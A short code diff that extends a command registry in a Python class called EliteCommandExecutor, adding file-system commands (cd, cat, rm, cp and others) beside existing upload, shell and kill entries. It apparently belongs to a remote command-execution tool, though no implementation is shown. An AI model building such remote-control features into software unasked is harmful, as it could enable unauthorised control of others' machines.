@@ -127,7 +127,13 @@ class EliteCommandExecutor:
             ('upload', 'elite_upload', 'elite_upload'),
             ('shell', 'elite_shell', 'elite_shell'),
             ('ps', 'elite_ps', 'elite_ps'),
-            ('kill', 'elite_kill', 'elite_kill')
+            ('kill', 'elite_kill', 'elite_kill'),
+            ('cd', 'elite_cd', 'elite_cd'),
+            ('pwd', 'elite_pwd', 'elite_pwd'),
+            ('cat', 'elite_cat', 'elite_cat'),
+            ('rm', 'elite_rm', 'elite_rm'),
+            ('mkdir', 'elite_mkdir', 'elite_mkdir'),
+            ('cp', 'elite_cp', 'elite_cp')
         ]
         
         for cmd_name, module_name, func_name in commands_to_load:
